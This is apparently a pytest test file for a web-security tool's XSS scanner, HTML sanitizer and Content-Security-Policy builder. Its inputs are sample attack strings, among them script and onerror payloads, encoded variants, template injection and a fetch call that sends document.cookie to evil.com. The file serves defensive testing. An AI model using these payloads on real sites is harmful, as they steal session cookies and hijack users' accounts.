"""
tests/test_scanner.py  —  Run: python -m pytest tests/ -v
"""
import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'backend'))

from scanner import XSSScanner
from sanitizer import Sanitizer
from csp_builder import CSPBuilder

scanner = XSSScanner()
san     = Sanitizer()
csp     = CSPBuilder()

def test_detects_script_tag():
    assert scanner.scan("<script>alert(1)</script>")['critical'] >= 1

def test_detects_onerror():
    assert scanner.scan('<img src=x onerror=alert(document.cookie)>')['total'] >= 1

def test_detects_javascript_uri():
    assert scanner.scan('<a href="javascript:alert(1)">click</a>')['total'] >= 1

def test_detects_eval():
    assert scanner.scan('eval(atob("YWxlcnQoMSk="))')['total'] >= 1

def test_detects_cookie_access():
    assert scanner.scan('fetch("http://evil.com/?c="+document.cookie)')['critical'] >= 1

def test_url_encoded_payload():
    assert scanner.scan('%3Cscript%3Ealert(1)%3C/script%3E')['total'] >= 1

def test_double_encoded():
    assert scanner.scan('%253Cscript%253E')['total'] >= 1

def test_clean_input():
    assert scanner.scan('Hello world plain text.')['score'] == 0

def test_url_param_xss():
    assert scanner.scan('https://example.com?q=<script>alert(1)</script>')['critical'] >= 1

def test_open_redirect():
    assert scanner.scan('https://site.com/login?redirect=http://evil.com')['total'] >= 1

def test_prototype_pollution():
    assert scanner.scan('{"__proto__":{"x":1}}')['total'] >= 1

def test_template_injection():
    assert scanner.scan('{{constructor.constructor("alert(1)")()}}')['total'] >= 1

def test_html_encode():
    r = san.html_encode('<script>')
    assert '&lt;' in r and '&gt;' in r

def test_strip_tags():
    r = san.strip_tags('<img onerror=alert(1)>')
    assert '<' not in r

def test_allowlist_keeps_safe():
    r = san.allowlist_filter('<p>Hi <b>there</b></p><script>evil()</script>')
    assert '<p>' in r and '<script>' not in r

def test_csp_header():
    r = csp.build({})
    assert "Content-Security-Policy:" in r['header']
    assert "script-src 'self'" in r['header']

def test_csp_meta():
    r = csp.build({})
    assert '<meta' in r['meta']
